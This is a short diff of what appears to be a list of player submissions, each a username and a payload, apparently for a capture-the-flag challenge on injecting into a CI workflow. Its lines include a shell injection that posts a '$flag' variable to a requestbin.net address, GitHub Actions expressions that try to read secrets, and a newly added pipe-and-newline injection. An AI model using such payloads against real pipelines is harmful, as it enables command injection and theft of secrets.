@@ -516,3 +516,4 @@ jiayuqi7813:";curl -X POST -d "fizz=$flag" http://requestbin.net/r/f3ixi7j0;echo
 Mr-sh11:${{ secret.FLAG }}
 ${{ env.FLAG }}
 ${{ secret.flag }}
+zghh007:\n|echo "hello world" >> issues|\n
